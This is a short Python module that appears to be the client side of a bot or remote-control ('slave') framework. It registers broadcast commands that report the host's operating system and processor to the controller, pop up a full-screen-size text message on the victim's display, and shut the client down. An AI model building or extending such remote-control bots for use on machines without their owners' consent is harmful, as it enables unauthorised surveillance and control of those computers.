from slave.lib.client import Bot
from typing import List
from tkinter import Tk, Label
from threading import Thread
import platform
import time


BotBasic = Bot()

@BotBasic.register('quit', all=True)
def exit_server(bot: Bot, args: List[str]):
    bot.exit_server()


@BotBasic.register('info', all=True)
def sys_info(bot: Bot, args:List[str]):  
    template = f"OS: {platform.system()} {platform.release()} -- Processor: {platform.processor()}"
    bot.send_text(template)



@BotBasic.register('message', all=True)
def show_msg_with_tk(bot: Bot, args: List[str]):
    win = Tk()
    win.title("Slave Message")
    lbl = Label(win, text=' '.join(args[1:-1]), font=('Aria Bold', 50))
    lbl.grid(column=0, row=0)
    sec = args[len(args) - 1]
    if not sec.isnumeric():
        bot.send_text("Command syntax error")
        return 0
    if int(sec) != 0:
        win.after(sec, lambda: win.destroy())
    
    bot.send_text("Opening tkinter frame...")
    win.mainloop()